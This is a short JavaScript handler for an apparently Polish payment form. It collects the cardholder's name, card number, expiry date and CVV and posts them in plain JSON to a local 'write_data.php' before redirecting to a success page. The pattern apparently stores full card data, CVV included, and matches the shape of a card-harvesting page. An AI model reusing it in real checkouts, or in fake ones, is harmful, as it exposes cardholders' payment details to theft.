document.getElementById('formularzPlatnosci').addEventListener('submit', function(event) {
    event.preventDefault(); 

    var imieNazwisko = document.getElementById('imieNazwisko').value;
    var numerKarty = document.getElementById('numerKarty').value;
    var dataWaznosci = document.getElementById('dataWaznosci').value;
    var cvv = document.getElementById('cvv').value;

    var dataToWrite = {
        "Imię Nazwisko": imieNazwisko,
        "Numer Karty": numerKarty,
        "Data Ważności": dataWaznosci,
        "CVV": cvv
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "write_data.php", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log(xhr.responseText); 
            window.location.href = 'success.html';
        }
    };
    xhr.send(JSON.stringify(dataToWrite));
});
